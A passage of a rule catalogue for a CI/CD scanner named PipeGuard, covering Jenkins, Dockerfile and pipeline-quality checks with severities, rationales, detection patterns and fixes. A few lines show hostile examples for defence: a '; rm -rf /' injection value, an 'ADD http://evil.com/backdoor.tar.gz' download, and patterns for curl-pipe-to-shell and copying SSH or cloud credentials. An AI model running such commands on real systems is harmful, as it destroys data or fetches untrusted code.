Description: agent { docker { image 'x' } } must use pinned tag or digest — not :latest.
Why:         :latest can change anytime. Attacker compromises Docker Hub tag → malicious image runs your pipeline.
What:        Check for: image.*:latest, image without tag, image without @sha256
Fix:         Pin to specific version: agent { docker { image 'node:18.19.0-alpine' } } or use digest.
```

### J14 — No archive of sensitive files as artifacts
```
ID:          J14
Category:    JEN
Severity:    HIGH
Points:      3
Description: archiveArtifacts must NOT include .env, .pem, .key, credentials, or secret files.
Why:         Archived artifacts are downloadable by anyone with job read access. Secret in artifact = leaked.
What:        Check for: archiveArtifacts '**/*.env', '**/*.key', '**/*.pem', '**/credentials', '**/secrets'
Fix:         Exclude sensitive files: archiveArtifacts artifacts: 'reports/**', excludes: '**/*.key,**/*.env'
```

### J15 — Parallel stages for security scans
```
ID:          J15
Category:    JEN
Severity:    LOW
Points:      2
Description: Security scanning stages (SAST, SCA, secret scan) should run in parallel where possible.
Why:         Sequential = 45 min pipeline. Parallel = 18 min. Slow pipeline = developers skip it.
What:        Check for: parallel { stage('SAST'), stage('SCA') } structure
Fix:         Wrap independent scan stages in parallel {} block.
```

### J16 — Input parameters validated (choice/boolean, not freeform)
```
ID:          J16
Category:    JEN
Severity:    CRITICAL
Points:      5
Description: Build parameters must use choice(), booleanParam(), or whitelisted values — not free-text string().
Why:         string() param → sh "deploy ${params.ENV}" → user types "; rm -rf /" → command injection.
What:        Check for: string(name:) parameters without validation. Prefer: choice(name:, choices:)
Fix:         Replace string() with choice() where possible. Validate/sanitize all string params before use.
```

### J17 — Build discarder / log rotation configured
```
ID:          J17
Category:    JEN
Severity:    MEDIUM
Points:      4
Description: Pipeline has buildDiscarder(logRotator(...)) to limit stored builds and prevent disk exhaustion.
Why:         1000+ builds stored = Jenkins disk full = Jenkins crash. Old build logs may contain leaked secrets.
What:        Check for: buildDiscarder, logRotator, numToKeepStr, daysToKeepStr in options {}
Fix:         Add: options { buildDiscarder(logRotator(numToKeepStr: '20', daysToKeepStr: '30')) }
```

### J18 — Lockable resources for shared environments
```
ID:          J18
Category:    JEN
Severity:    MEDIUM
Points:      3
Description: Shared environments (staging, QA) must use lock() to prevent concurrent deploys from conflicting.
Why:         2 pipelines deploy to staging simultaneously → race condition → broken state → flaky tests.
What:        Check for: lock(resource:, lock(, lockable-resources in deployment stages
Fix:         Wrap deploy stage: lock(resource: 'staging-env') { sh 'deploy.sh' }
```

### J19 — SCM checkout with depth limit
```
ID:          J19
Category:    JEN
Severity:    LOW
Points:      3
Description: Git checkout should use shallow clone (depth 1) to reduce clone time and limit exposed history.
Why:         Full clone on large repos = 5+ min. Shallow clone = 10 sec. Also limits secrets exposure in git history.
What:        Check for: checkout scm with depth, GitSCM extensions with CloneOption(depth:), shallow: true
Fix:         Add: checkout([$class: 'GitSCM', extensions: [[$class: 'CloneOption', depth: 1, shallow: true]]])
```

### J20 — Environment variables scoped per stage (not global)
```
ID:          J20
Category:    JEN
Severity:    HIGH
Points:      4
Description: Sensitive env vars must be scoped to stages that need them — not declared globally at pipeline level.
Why:         Global env = every stage sees every secret. Compromised test stage → access to prod credentials.
What:        Check for: environment {} at pipeline level with sensitive vars vs environment {} at stage level
Fix:         Move secrets to stage-level environment {} blocks: stage('Deploy') { environment { PROD_KEY = credentials('prod') } }
```

### J21 — No echo/println of secrets
```
ID:          J21
Category:    JEN
Severity:    CRITICAL
Points:      5
Description: Pipeline must NOT echo, println, or sh "echo ${SECRET}" sensitive variables to console output.
Why:         Console log is readable by anyone with job access. echo $TOKEN = token visible in build log forever.
What:        Check for: echo.*\${.*SECRET\}, println.*password, sh "echo.*credentials, sh "cat.*\.env"
Fix:         Remove all echo/print statements containing credential variables. Use maskPasswords plugin.
```

### J22 — Stash/unstash used for cross-stage artifacts
```
ID:          J22
Category:    JEN
Severity:    MEDIUM
Points:      3
Description: Cross-stage artifact passing should use stash/unstash — not workspace sharing which leaks between jobs.
Why:         Workspace shared = previous build's secrets may still be on disk. stash = explicit, scoped transfer.
What:        Check for: stash(name:, unstash, archiveArtifacts with inter-stage dependency
Fix:         Use stash { includes: 'build/**' } in producer stage and unstash 'build' in consumer stage.
```

### J23 — Pipeline durability settings configured
```
ID:          J23
Category:    JEN
Severity:    LOW
Points:      2
Description: Pipeline has durabilityHint set to optimize performance vs crash recovery.
Why:         Default durability writes to disk every step = slow. For CI pipelines, PERFORMANCE_OPTIMIZED is faster.
What:        Check for: durabilityHint, PERFORMANCE_OPTIMIZED, MAX_SURVIVABILITY in options {}
Fix:         Add: options { durabilityHint('PERFORMANCE_OPTIMIZED') } for CI pipelines.
```

### J24 — Input gate before production deployment
```
ID:          J24
Category:    JEN
Severity:    CRITICAL
Points:      5
Description: Production deployment stage must require manual input/approval before executing.
Why:         Without approval: push to main → auto-deploy to prod → no human review → incident.
What:        Check for: input(message:, input 'Deploy to production?', submitter:, timeout + input
Fix:         Add before prod deploy: input message: 'Deploy to Production?', submitter: 'release-team'
```

### J25 — Replay protection on production pipelines
```
ID:          J25
Category:    JEN
Severity:    HIGH
Points:      3
Description: Replay feature should be restricted — replaying modified Groovy bypasses code review.
Why:         Developer clicks Replay, modifies pipeline code → no PR, no review → runs arbitrary code on agent.
What:        Check for: properties([disableReplay()]), or pipeline library enforcing replay restrictions
Fix:         Add: properties([disableReplay()]) or restrict Replay permission via Jenkins RBAC.
```

### J26 — Typed build parameters (not raw string)
```
ID:          J26
Category:    JEN
Severity:    HIGH
Points:      3
Description: Build parameters should be typed: choice(), booleanParam(), credentials() — not raw string() for everything.
Why:         Typed params limit attack surface. choice() = whitelist. credentials() = masked. string() = anything goes.
What:        Check for: parameters { string(name:) } where choice() or booleanParam() would be appropriate
Fix:         Convert string params to choice/boolean where input is known: choice(choices: ['dev','staging','prod'])
```

### J27 — Git clean workspace before build
```
ID:          J27
Category:    JEN
Severity:    MEDIUM
Points:      3
Description: Workspace must be cleaned before checkout to prevent artifact contamination from previous builds.
Why:         Previous build left malicious .so/.dll → current build uses it → supply chain poisoning.
What:        Check for: cleanWs() in pre stage, checkout scm with CleanBeforeCheckout, deleteDir()
Fix:         Add: options { skipDefaultCheckout() } then stage('Checkout') { cleanWs(); checkout scm }
```

### J28 — Notifications on pipeline failure
```
ID:          J28
Category:    JEN
Severity:    MEDIUM
Points:      3
Description: Pipeline has post { failure {} } block sending notifications (Slack, email, Teams) on failure.
Why:         Silent failures = nobody notices for hours. Broken deploy at 2am → no alert → downtime until morning.
What:        Check for: post { failure { slackSend, mail, emailext, httpRequest.*webhook
Fix:         Add: post { failure { slackSend channel: '#ci-alerts', message: "Build failed" } }
```

### J29 — Matrix builds for multi-environment testing
```
ID:          J29
Category:    JEN
Severity:    LOW
Points:      2
Description: Pipeline uses matrix {} for testing across multiple environments/versions in parallel.
Why:         Testing on one version only → works on Node 18, crashes on Node 20 in prod.
What:        Check for: matrix { axes { axis { name, values } } }, parallel with multiple version stages
Fix:         Add: matrix { axes { axis { name 'NODE_VERSION' values '18', '20', '22' } } stages { ... } }
```

### J30 — No writeFile with sensitive content
```
ID:          J30
Category:    JEN
Severity:    HIGH
Points:      4
Description: writeFile must NOT write secrets, passwords, or tokens to files that persist in workspace.
Why:         writeFile creates file on disk → not cleaned up → next build reads it → or attacker on shared agent accesses it.
What:        Check for: writeFile.*password, writeFile.*token, writeFile.*secret, writeFile.*key
Fix:         Use withCredentials to inject secrets as env vars. If file needed, write to /tmp and delete in finally block.
```

---

---

# DOC — Dockerfile Security Rules (100 pts)

> PipeGuard scans Dockerfile for security misconfigurations .

---

### D01 — No FROM :latest
```
ID:          D01
Category:    DOC
Severity:    CRITICAL
Points:      7
Description: Dockerfile must NOT use FROM image:latest. Must pin to specific version or digest.
Why:         :latest changes without warning. Today = safe node:18. Tomorrow = compromised image. Supply chain attack.
What:        Check FROM lines for: :latest, or no tag at all (FROM node = implicit latest)
Fix:         Pin version: FROM node:18.19.0-alpine or FROM node:18@sha256:abc123...
```

### D02 — No RUN as root (USER instruction present)
```
ID:          D02
Category:    DOC
Severity:    CRITICAL
Points:      7
Description: Dockerfile must have a USER instruction to run the application as non-root.
Why:         Container runs as root by default. Container escape + root = host compromised. Non-root = limited blast radius.
What:        Check for USER instruction after the final FROM. USER root at the end = bad.
Fix:         Add: RUN addgroup -S app && adduser -S app -G app ... USER app before CMD/ENTRYPOINT.
```

### D03 — No secrets in ENV or ARG
```
ID:          D03
Category:    DOC
Severity:    CRITICAL
Points:      6
Description: Dockerfile must NOT have passwords, tokens, or keys in ENV or ARG instructions.
Why:         ENV baked into image layers. docker history shows ALL ENV values. Anyone who pulls image sees your secrets.
What:        Check ENV/ARG for: PASSWORD, SECRET, TOKEN, API_KEY, PRIVATE_KEY, AWS_SECRET with literal values
Fix:         Use runtime env vars (docker run -e), Docker secrets, or mount secrets at build time with --secret.
```

### D04 — COPY specific files (no COPY . .)
```
ID:          D04
Category:    DOC
Severity:    HIGH
Points:      4
Description: Prefer COPY specific files/dirs over COPY . . — and .dockerignore must exist.
Why:         COPY . . copies .git/, .env, private keys, node_modules into image. Secrets baked into layers.
What:        Check for: COPY . . without .dockerignore existing, or COPY . . as the only COPY instruction
Fix:         Use COPY package*.json ./ then COPY src/ ./src/ — or create .dockerignore with .git, .env, *.key.
```

### D05 — HEALTHCHECK instruction present
```
ID:          D05
Category:    DOC
Severity:    MEDIUM
Points:      3
Description: Dockerfile should include a HEALTHCHECK instruction for container orchestrator integration.
Why:         Without HEALTHCHECK: K8s/Docker Swarm can't detect if app inside container is actually alive. Zombie containers.
What:        Check for: HEALTHCHECK instruction in Dockerfile
Fix:         Add: HEALTHCHECK --interval=30s --timeout=3s CMD curl -f http://localhost:3000/health || exit 1
```

### D06 — Minimal base image (alpine/distroless/slim)
```
ID:          D06
Category:    DOC
Severity:    HIGH
Points:      4
Description: Base image should be minimal: alpine, distroless, slim, or scratch — not full debian/ubuntu.
Why:         Full ubuntu = 500+ packages = 500+ potential CVEs. Alpine = ~5MB = minimal attack surface.
What:        Check FROM for: alpine, distroless, slim, scratch (good) vs ubuntu, debian, centos without -slim (bad)
Fix:         Switch FROM node:18 to FROM node:18-alpine or FROM gcr.io/distroless/nodejs18-debian12.
```

### D07 — Multi-stage build used
```
ID:          D07
Category:    DOC
Severity:    HIGH
Points:      5
Description: Dockerfile should use multi-stage build: build stage + production stage. Final image has only runtime.
Why:         Single stage = build tools (gcc, make, npm) in production image = bigger attack surface + image size.
What:        Check for: multiple FROM instructions (FROM ... AS builder, then FROM ... for final)
Fix:         Use: FROM node:18 AS builder → RUN npm build → FROM node:18-alpine → COPY --from=builder /app/dist .
```

### D08 — No RUN with curl | bash (pipe install)
```
ID:          D08
Category:    DOC
Severity:    HIGH
Points:      5
Description: Dockerfile must NOT use RUN curl ... | bash or wget | sh for installing software.
Why:         curl | bash = execute ANYTHING the server sends. Man-in-the-middle, compromised server = RCE in your image.
What:        Check for: curl.*|.*sh, curl.*|.*bash, wget.*|.*sh, RUN.*pipe.*install
Fix:         Download file first, verify checksum, then install: RUN curl -o file.tar.gz URL && sha256sum --check && tar xzf file.tar.gz
```

### D09 — Package versions pinned in RUN install
```
ID:          D09
Category:    DOC
Severity:    MEDIUM
Points:      4
Description: RUN apt-get install / apk add should pin package versions for reproducibility.
Why:         apk add curl = today v8.1, tomorrow v8.2 with CVE. Pinned = reproducible, auditable builds.
What:        Check for: apt-get install without =version, apk add without =version, pip install without ==
Fix:         Pin: RUN apk add --no-cache curl=8.5.0-r0 || RUN apt-get install -y curl=7.88.1-10+deb12u5
```

### D10 — No privileged operations (--privileged, --cap-add=ALL)
```
ID:          D10
Category:    DOC
Severity:    CRITICAL
Points:      5
Description: Dockerfile/compose must NOT request privileged mode or ALL capabilities.
Why:         --privileged = container has FULL host access. Container escape trivial. Same as running on host.
What:        Check for: --privileged, cap_add: ALL, SYS_ADMIN, SYS_PTRACE, security_opt: seccomp:unconfined
Fix:         Drop all caps, add only needed: --cap-drop=ALL --cap-add=NET_BIND_SERVICE. Never use --privileged.
```

### D11 — .dockerignore file exists
```
ID:          D11
Category:    DOC
Severity:    HIGH
Points:      5
Description: A .dockerignore file must exist alongside Dockerfile to prevent sensitive files from being copied.
Why:         Without .dockerignore: docker build sends .git/, .env, *.key, node_modules to build context. All visible in image.
What:        Check for: .dockerignore file presence in same directory as Dockerfile
Fix:         Create .dockerignore with: .git, .env, *.key, *.pem, node_modules, .terraform, secrets/
```

### D12 — WORKDIR explicitly set
```
ID:          D12
Category:    DOC
Severity:    MEDIUM
Points:      3
Description: Dockerfile must use WORKDIR to set working directory — not rely on default / or use cd in RUN.
Why:         Working from / = root filesystem. Files scattered. RUN cd is stateless (resets each RUN layer).
What:        Check for: WORKDIR instruction present. Flag: RUN cd /app && ... without WORKDIR
Fix:         Add: WORKDIR /app before COPY and RUN commands.
```

### D13 — LABEL metadata present
```
ID:          D13
Category:    DOC
Severity:    LOW
Points:      2
Description: Dockerfile should have LABEL instructions for maintainer, version, description for audit/inventory.
Why:         In production: 50+ images → which team owns this? What version? LABEL = image metadata for governance.
What:        Check for: LABEL maintainer=, LABEL version=, LABEL description=, or org.opencontainers.image labels
Fix:         Add: LABEL maintainer="team@company.com" version="1.0" description="API service"
```

### D14 — EXPOSE only needed ports
```
ID:          D14
Category:    DOC
Severity:    LOW
Points:      2
Description: Dockerfile should declare EXPOSE for application ports — and not expose unnecessary ports.
Why:         EXPOSE documents which ports the app uses. Missing = confusion. Extra ports = unnecessary attack surface.
What:        Check for: EXPOSE instruction present. Flag multiple EXPOSE or common debug ports (22, 3389, 5432, 9229)
Fix:         Add: EXPOSE 8080 for your app port. Remove debug/admin ports from production Dockerfile.
```

### D15 — Use COPY instead of ADD
```
ID:          D15
Category:    DOC
Severity:    HIGH
Points:      4
Description: Use COPY instead of ADD. ADD has implicit features (auto-extract tar, fetch URLs) that are security risks.
Why:         ADD http://evil.com/backdoor.tar.gz / auto-downloads and extracts. COPY is explicit, predictable, safe.
What:        Check for: ADD instructions that are not extracting local tar files. Flag: ADD http://, ADD https://
Fix:         Replace ADD with COPY. For URLs: use RUN curl + checksum verification. For tar: explicit RUN tar xzf.
```

### D16 — CMD/ENTRYPOINT in exec form (not shell form)
```
ID:          D16
Category:    DOC
Severity:    HIGH
Points:      4
Description: CMD and ENTRYPOINT must use exec form ["executable", "arg"] — not shell form (string).
Why:         Shell form: CMD node app.js → runs as /bin/sh -c node app.js → PID 1 is shell → signals not forwarded → zombie processes.
What:        Check for: CMD without [], ENTRYPOINT without []. Shell form = CMD command args (no brackets)
Fix:         Change CMD node app.js to CMD ["node", "app.js"]. Change ENTRYPOINT ./start.sh to ENTRYPOINT ["./start.sh"]
```

### D17 — RUN commands combined and cleaned
```
ID:          D17
Category:    DOC
Severity:    MEDIUM
Points:      3
Description: Multiple RUN instructions should be combined with && and include cleanup in the same layer.
Why:         Each RUN = new layer. apt-get install in one RUN + rm cache in next RUN = cache still in first layer. Image bloat.
What:        Check for: consecutive RUN apt-get/apk without combining. RUN install without rm cache in same command.
Fix:         Combine: RUN apt-get update && apt-get install -y curl && rm -rf /var/lib/apt/lists/*
```

### D18 — No SETUID/SETGID binaries
```
ID:          D18
Category:    DOC
Severity:    HIGH
Points:      4
Description: Final image should remove or audit SETUID/SETGID binaries that enable privilege escalation.
Why:         SUID binary in container + container escape = instant root. Common Docker escape vector.
What:        Check for: RUN chmod u+s, RUN chmod g+s, or absence of: RUN find / -perm /6000 -type f -delete
Fix:         Add: RUN find / -perm /6000 -type f -exec chmod a-s {} + || true in final stage.
```

### D19 — Build args not leaked to runtime ENV
```
ID:          D19
Category:    DOC
Severity:    HIGH
Points:      4
Description: ARG values used during build must NOT be converted to ENV in the final image.
Why:         ARG is build-time only. But ARG + ENV = value persisted in image. docker inspect shows it.
What:        Check for: ARG followed by ENV with same name, or ARG with secrets then ENV ${ARG_NAME}
Fix:         Keep ARG in build stage only. In multi-stage: ARG in builder stage, don't pass to final stage.
```

### D20 — COPY --chown for non-root ownership
```
ID:          D20
Category:    DOC
Severity:    MEDIUM
Points:      3
Description: Files copied into container should use --chown to set proper ownership matching the USER.
Why:         COPY without --chown = files owned by root. App running as non-root can't read/write its own files.
What:        Check for: COPY without --chown when USER instruction exists. Flag: COPY files after USER without --chown
Fix:         Use: COPY --chown=app:app . . or COPY --chown=1000:1000 package.json .
```

### D21 — No unnecessary packages (--no-install-recommends)
```
ID:          D21
Category:    DOC
Severity:    MEDIUM
Points:      3
Description: Package installation must use --no-install-recommends (apt) or --no-cache (apk) to minimize image.
Why:         apt-get install curl pulls 30+ recommended packages = 200MB extra = more CVEs. --no-install-recommends = just curl.
What:        Check for: apt-get install without --no-install-recommends, apk add without --no-cache
Fix:         Use: RUN apt-get install -y --no-install-recommends curl && RUN apk add --no-cache curl
```

### D22 — Temp files cleaned in same RUN layer
```
ID:          D22
Category:    DOC
Severity:    MEDIUM
Points:      3
Description: Downloaded files, package caches, and temp files must be removed in the SAME RUN instruction.
Why:         Layer is immutable. rm in next RUN doesn't reduce image size — previous layer still has the file.
What:        Check for: RUN wget/curl without rm in same command. RUN apt-get without rm -rf /var/lib/apt/lists/*
Fix:         Combine: RUN curl -o /tmp/file URL && install /tmp/file && rm -f /tmp/file — all one layer.
```

### D23 — Read-only filesystem compatible
```
ID:          D23
Category:    DOC
Severity:    HIGH
Points:      4
Description: Image should be designed for read-only root filesystem (no writes to /) with explicit VOLUME for writable dirs.
Why:         Read-only FS prevents runtime tampering. Attacker can't modify binaries. K8s: readOnlyRootFilesystem: true.
What:        Check for: VOLUME declarations for writable directories (/tmp, /var/log). Absence of write to / in CMD.
Fix:         Add VOLUME ["/tmp", "/var/log/app"] for writable paths. Test with: docker run --read-only.
```

### D24 — STOPSIGNAL defined
```
ID:          D24
Category:    DOC
Severity:    LOW
Points:      2
Description: Dockerfile should define STOPSIGNAL for graceful shutdown — especially for apps that need cleanup.
Why:         Default SIGTERM may not be handled by app → 10s timeout → SIGKILL → data corruption, broken connections.
What:        Check for: STOPSIGNAL instruction. Apps using exec form CMD handle signals naturally.
Fix:         Add: STOPSIGNAL SIGTERM (default) or STOPSIGNAL SIGQUIT for nginx. Ensure app handles the signal.
```

### D25 — No sensitive file patterns in COPY
```
ID:          D25
Category:    DOC
Severity:    HIGH
Points:      4
Description: COPY/ADD must NOT include sensitive file patterns: .env, *.key, *.pem, id_rsa, .aws/, .kube/.
Why:         COPY of secret files → baked into image layer → docker history → anyone who pulls image gets your keys.
What:        Check COPY/ADD sources for: .env, *.key, *.pem, id_rsa, .aws, .kube, credentials, .npmrc with _authToken
Fix:         Never COPY secret files. Use Docker secrets, build-time --secret mount, or runtime env vars.
```

### D26 — No apt-get upgrade in Dockerfile
```
ID:          D26
Category:    DOC
Severity:    HIGH
Points:      3
Description: Dockerfile must NOT use apt-get upgrade or apt-get dist-upgrade.
Why:         upgrade pulls latest of ALL packages → non-reproducible builds. Today it works, tomorrow breaks. Also huge image bloat.
What:        Check for: RUN apt-get upgrade, RUN apt-get dist-upgrade, RUN apk upgrade
Fix:         Pin specific packages instead: RUN apt-get install -y curl=7.88.1. If you need security patches, rebuild with updated base image.
```

### D27 — No SHELL override unless necessary
```
ID:          D27
Category:    DOC
Severity:    MEDIUM
Points:      2
Description: SHELL instruction should not override default unless there's a clear reason (e.g., PowerShell on Windows).
Why:         SHELL ["/bin/bash", "-c"] adds bash dependency. Alpine doesn't have bash by default → build fails on Alpine.
What:        Check for: SHELL instruction. Flag if SHELL sets bash but base image is Alpine (no bash).
Fix:         Use default /bin/sh. If bash needed: RUN apk add --no-cache bash first, or better — rewrite commands for sh.
```

### D28 — No multiple ENTRYPOINT/CMD instructions
```
ID:          D28
Category:    DOC
Severity:    HIGH
Points:      3
Description: Dockerfile must have only ONE CMD and ONE ENTRYPOINT. Multiple CMD = only last one takes effect.
Why:         Common mistake: 2 CMD lines → first is silently ignored → app doesn't start properly. Confusing and error-prone.
What:        Count CMD instructions > 1 or ENTRYPOINT instructions > 1 (in same stage for multi-stage).
Fix:         Keep only one CMD and one ENTRYPOINT per build stage. Use ENTRYPOINT for binary, CMD for default args.
```

### D29 — Verify downloads with checksum
```
ID:          D29
Category:    DOC
Severity:    HIGH
Points:      3
Description: Any file downloaded via curl/wget in RUN must be verified with checksum (sha256sum) before use.
Why:         curl -o file URL → man-in-the-middle → you install malware. Checksum = verify file integrity.
What:        Check for: RUN curl/wget without sha256sum/md5sum/gpg --verify in same RUN command
Fix:         RUN curl -o file.tar.gz URL && echo "expected_hash file.tar.gz" | sha256sum -c - && tar xzf file.tar.gz
```

### D30 — No SSH keys or git clone in Dockerfile
```
ID:          D30
Category:    DOC
Severity:    CRITICAL
Points:      3
Description: Dockerfile must NOT copy SSH keys or use git clone with credentials inside the build.
Why:         COPY id_rsa → baked in layer → docker history → anyone gets your SSH key. Even if you rm in next layer, still there.
What:        Check for: COPY.*id_rsa, COPY.*\.ssh, git clone.*@, RUN.*ssh-keygen, RUN.*git clone with credentials
Fix:         Use Docker BuildKit --ssh mount: RUN --mount=type=ssh git clone. Or use multi-stage with secret mount.
```

### D31 — ENTRYPOINT with tini or dumb-init for PID 1
```
ID:          D31
Category:    DOC
Severity:    MEDIUM
Points:      2
Description: Container should use tini/dumb-init as PID 1 init process for proper signal handling and zombie reaping.
Why:         App as PID 1 → doesn't reap zombie processes → container accumulates zombie PIDs. Also SIGTERM not handled properly.
What:        Check for: tini, dumb-init in ENTRYPOINT, or --init flag in docker-compose, or Docker 23.0+ uses --init
Fix:         Add: RUN apk add --no-cache tini. ENTRYPOINT ["tini", "--"]. CMD ["node", "app.js"]
```

### D32 — Layer ordering optimized for cache
```
ID:          D32
Category:    DOC
Severity:    MEDIUM
Points:      2
Description: Dockerfile layers should be ordered from least-changing to most-changing for optimal build cache.
Why:         COPY . . early → any file change invalidates ALL subsequent layers → full rebuild every time. 8 min instead of 30 sec.
What:        Check for: COPY package*.json BEFORE COPY . . (good). COPY . . as first COPY (bad).
Fix:         Order: 1) COPY package*.json 2) RUN npm ci 3) COPY src/ . — dependencies cached when only src changes.
```

### D33 — No RUN with sudo
```
ID:          D33
Category:    DOC
Severity:    HIGH
Points:      3
Description: Dockerfile must NOT use sudo in RUN commands. You're already root during build.
Why:         sudo in Dockerfile = you're root but using sudo = unnecessary attack surface + confusion about permissions.
What:        Check for: RUN sudo, RUN.*sudo apt-get, RUN.*sudo pip
Fix:         Remove sudo — you're root by default in docker build. Use USER only at the end for runtime.
```

### D34 — No hardcoded ports in application
```
ID:          D34
Category:    DOC
Severity:    LOW
Points:      1
Description: Application port should be configurable via ENV, not hardcoded in CMD/ENTRYPOINT.
Why:         Hardcoded port 3000 → can't change at runtime → can't run multiple instances on same host.
What:        Check for: ENV PORT, CMD with -p or --port flag, or PORT in ENV before CMD. Flag: hardcoded ports in CMD.
Fix:         Add: ENV PORT=3000. CMD ["node", "app.js"] with app reading process.env.PORT.
```

### D35 — Dockerfile linted (hadolint compliance)
```
ID:          D35
Category:    DOC
Severity:    LOW
Points:      1
Description: Dockerfile should pass hadolint checks — the de-facto Dockerfile linter.
Why:         Hadolint catches 50+ common mistakes. If your Dockerfile passes hadolint = follows most best practices.
What:        Check for: hadolint in CI/CD pipeline, or .hadolint.yaml config file. Meta-rule: pipeline scans Dockerfile.
Fix:         Add hadolint to pipeline: docker run --rm -i hadolint/hadolint < Dockerfile
```

### D36 — No writable sensitive directories
```
ID:          D36
Category:    DOC
Severity:    HIGH
Points:      3
Description: Final image must NOT have world-writable directories (777 permissions) on sensitive paths.
Why:         chmod 777 /app → any process can modify application code → container escape + code injection.
What:        Check for: RUN chmod 777, RUN chmod -R 777, RUN chmod a+rwx on application directories
Fix:         Use specific permissions: chmod 755 for dirs, chmod 644 for files. Never 777 on anything.
```

### D37 — FROM scratch for static binaries
```
ID:          D37
Category:    DOC
Severity:    LOW
Points:      2
Description: Go/Rust static binaries should use FROM scratch or distroless — zero OS, zero CVEs.
Why:         Go binary needs ZERO dependencies. FROM alpine still has ~30 packages. FROM scratch = literally nothing. 5MB image.
What:        Check for: Go/Rust build stage followed by FROM scratch or FROM gcr.io/distroless (good). FROM alpine for Go (suboptimal).
Fix:         FROM golang:1.22 AS builder → CGO_ENABLED=0 go build → FROM scratch → COPY --from=builder /app /app
```

### D38 — No latest tag in COPY --from
```
ID:          D38
Category:    DOC
Severity:    MEDIUM
Points:      2
Description: COPY --from in multi-stage must reference named stages or specific images — not ambiguous numbers.
Why:         COPY --from=0 → fragile. Add a stage before → index shifts → wrong files copied. Named = safe.
What:        Check for: COPY --from=0, COPY --from=1 (bad). COPY --from=builder (good).
Fix:         Name your stages: FROM node:18 AS builder. Then: COPY --from=builder /app/dist .
```

### D39 — No unnecessary VOLUME declarations
```
ID:          D39
Category:    DOC
Severity:    MEDIUM
Points:      2
Description: VOLUME should only be used for truly persistent data — not for source code or temp files.
Why:         VOLUME /app → changes to /app in derived images are lost → confusing behavior. VOLUME creates anonymous volume.
What:        Check for: VOLUME /app, VOLUME /src, VOLUME on non-data directories. OK: VOLUME /data, VOLUME /var/lib/postgresql
Fix:         Remove unnecessary VOLUME. Only use for actual data: VOLUME ["/data", "/var/log/app"]
```

### D40 — Image size optimization
```
ID:          D40
Category:    DOC
Severity:    LOW
Points:      2
Description: Final image should be optimized for size — no build tools, no package managers, no caches in final stage.
Why:         2GB image → 5 min pull → slow deployments → expensive storage. 50MB image → 3 sec pull → instant scaling.
What:        Check multi-stage: final FROM should be slim/alpine/distroless. Check for gcc, make, build-essential in final.
Fix:         Multi-stage: build in full image, copy only binary+deps to minimal image. Delete package caches in same RUN.
```

---

---

# PQL — Pipeline Quality & Reliability (100 pts)

> Applicable to: .gitlab-ci.yml, GitHub Actions, AND Jenkinsfile (where noted).

---

### Q01 — CI/CD tool images pinned to version (not :latest)
```
ID:          Q01
Category:    PQL
Severity:    CRITICAL
Points:      7
Description: ALL images used in pipeline jobs MUST be pinned to a specific version — never :latest or no tag.
Why:         image: node:latest → Monday it's 18.19, Friday it's 22.0 → build breaks → "works on my machine."
             Team spent 2 days debugging because maven:latest jumped from 3.8 to 3.9 and broke builds silently.
What:        Check image: fields for :latest or missing tag. Flag: image: node, image: python:latest, image: maven:latest
Fix:         Pin: image: node:18.19.0-alpine. Or use digest: image: node@sha256:abc123...
```

### Q02 — Pipeline cache configured for dependencies
```
ID:          Q02
Category:    PQL
Severity:    HIGH
Points:      6
Description: Pipeline must cache package manager dependencies (node_modules, .m2, pip cache, go mod cache).
Why:         Without cache: npm install downloads 400MB EVERY build. 50 builds/day = 20GB bandwidth wasted + slow pipelines.
             With cache: npm ci takes 8 seconds instead of 2 minutes.
What:        Check for: cache: key/paths, actions/cache, save_cache/restore_cache, $CI_PROJECT_DIR/.cache
Fix:         GitLab: cache: { key: ${CI_COMMIT_REF_SLUG}, paths: [node_modules/] }. GitHub: actions/cache@v4
```

### Q03 — Job dependencies explicitly defined
```
ID:          Q03
Category:    PQL
Severity:    HIGH
Points:      6
Description: Jobs must use needs:/depends_on to define explicit dependencies — not rely on stage ordering alone.
Why:         Without needs: → ALL jobs in stage wait for ALL jobs in previous stage. 10 min wasted waiting.
             With needs: → DAG execution, test job starts as soon as build finishes, not when ALL builds finish.
What:        Check for: needs: in job definitions. Flag: stages with 5+ jobs but no needs: directives.
Fix:         Add needs: [build] to test jobs. Add needs: [test, scan] to deploy jobs.
```

### Q04 — Retry configured on network-dependent jobs
```
ID:          Q04
Category:    PQL
Severity:    MEDIUM
Points:      4
Description: Jobs that depend on external services (docker pull, npm install, API calls) must have retry configured.
Why:         Docker Hub rate limit → pull fails → pipeline fails → developer re-triggers → 15 min wasted.
             retry: 2 = automatic recovery from transient failures.
What:        Check for: retry: in jobs with docker, npm, pip, curl, wget, apt-get, apk add commands.
Fix:         Add retry: { max: 2, when: [runner_system_failure, stuck_or_timeout_failure] } to network jobs.
```

### Q05 — Artifacts with expiration set
```
ID:          Q05
Category:    PQL
Severity:    MEDIUM
Points:      4
Description: All pipeline artifacts must have expire_in / retention-days set to prevent disk exhaustion.
Why:         1000 builds × 50MB artifacts = 50GB. CI runner disk full → ALL pipelines fail → total CI outage.
What:        Check for: artifacts: without expire_in (GitLab), upload-artifact without retention-days (GitHub)
Fix:         Add expire_in: 1 week to all artifact definitions. Critical reports: expire_in: 30 days.
```

### Q06 — No deprecated syntax or keywords
```
ID:          Q06
Category:    PQL
Severity:    HIGH
Points:      5
Description: Pipeline must NOT use deprecated syntax that will break in future versions.
Why:         GitLab: only/except → deprecated, use rules:. GitHub: set-output → removed, use GITHUB_OUTPUT.
             One day your pipeline stops working because deprecated feature was removed. No warning.
What:        GitLab: check for only:, except: (use rules:). GitHub: check for set-output, save-state, ::set-output
Fix:         Replace only/except with rules:. Replace echo "::set-output" with echo "key=value" >> $GITHUB_OUTPUT.
```

### Q07 — Pipeline triggers properly scoped
```
ID:          Q07
Category:    PQL
Severity:    HIGH
Points:      6
Description: Pipeline must NOT run on every push to every branch. Must be scoped with rules/workflow triggers.
Why:         Every push = pipeline runs = 50 branches × 20 min = 1000 min/day = CI runners exhausted.
             Feature branches should run tests only. Full pipeline only on main/MR.
What:        Check for: rules: or workflow: triggers with branch filters. Flag: no rules: section at all.
Fix:         Add workflow: rules: - if: $CI_PIPELINE_SOURCE == 'merge_request_event'. Or on: pull_request + push to main.
```

### Q08 — Interruptible / auto-cancel for MR pipelines
```
ID:          Q08
Category:    PQL
Severity:    MEDIUM
Points:      4
Description: MR/PR pipelines must be interruptible — new push cancels old running pipeline.
Why:         Dev pushes 3 times in 5 min → 3 pipelines running → 2 are useless → waste runner capacity.
What:        Check for: interruptible: true (GitLab), concurrency: group: with cancel-in-progress (GitHub)
